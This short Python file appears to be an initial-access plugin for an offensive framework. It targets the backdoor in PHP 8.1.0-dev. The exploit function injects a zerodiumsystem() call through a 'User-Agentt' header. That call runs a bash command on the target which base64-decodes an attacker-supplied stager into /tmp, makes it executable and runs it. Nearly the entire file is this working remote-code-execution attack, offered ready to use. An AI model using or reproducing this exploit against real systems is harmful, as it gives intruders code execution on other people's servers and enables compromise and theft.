
# [PLUGIN INITIAL ACCESS] PHP 8.1.0-dev backdoor

import requests

def exploit(ip_dest: str, port_dest: int, ip_src: str, port_src: int, stager: str) -> bool | Exception:
    """
    Try to exploit the vulnerability
    """
    request = requests.Session()
    host = 'http://{0}:{1}'.format(ip_dest, port_dest)
    try:
        print('[+] Attempting to gain initial access with php 8.1.0-dev backdoor on {}'.format(host))
        r = requests.get(host)
        rs = '/bin/bash -c "echo {0} | base64 -d > /tmp/stager.sh && chmod +x /tmp/stager.sh && /tmp/stager.sh"'.format(stager.decode("utf-8"))
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + rs + "');"
        }
        request.get(host, headers = headers, allow_redirects = False)
        return True
    except Exception as e:
        return e